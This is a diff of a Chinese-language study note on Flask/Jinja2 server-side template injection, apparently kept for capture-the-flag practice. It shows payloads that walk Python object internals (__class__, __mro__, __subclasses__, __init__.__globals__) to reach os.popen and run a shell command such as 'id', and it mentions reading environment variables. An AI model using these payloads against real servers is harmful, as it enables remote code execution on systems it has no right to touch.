@@ -1,14 +1,14 @@
-# flask模板注入
+# **flask模板注入**
 
-## 注意：os模板必须要使用对象方法源码内导入了os模板的,如果直接用()之类的python内置的字面量,他们的源码并未导入os模块,会使用失败,这时候要使用<u>popen</u>
+### *注意：os模板必须要使用对象方法源码内导入了os模板的,如果直接用()之类的python内置的字面量,他们的源码并未导入os模块,会使用失败,这时候要使用<u>popen</u>*
 
-## os模块仅使用*<u>flask定义的有os模块</u>*的对象或者导入os模块的<u>自定义的函数方法</u>,列如
+### ***os模块仅使用<u>flask定义的有os模块</u>的对象或者导入os模块的<u>自定义的函数方法</u>,列如***
 
 ```
 import os
 class cat():
-​    def __init__(self):
-​        pass
+    def __init__(self):
+        pass
 print(cat().__class__.__init__.__globals__['os'].popen('id').read())
 cat为自定义的类,导入了os模板影响了cat,此时他就可以使用os
 ```
@@ -96,9 +96,10 @@ os.environ                   # 读环境变量（常藏 flag）
 .__base__ / __mro__[1].__subclasses__()
 ```
 
-### 找到含有popen的子类,用下标锁定,然后使用原方案,此时已绕过元素限制获得类属性,按照上述的获取函数方法提取popen模板即可
+### 找到含有os的子类,用下标锁定,然后使用原方案,此时已绕过元素限制获得类属性,按照上述的获取函数方法提取popen模板即可
 
 ```
 ().__class__.__mro__[1].__subclasses__()[下标].__init__.__globals__['popen'].popen('id').read()
 ```
 
+**由于使用的()之类的字面量源码包没有导入os,所以使用要用popen**
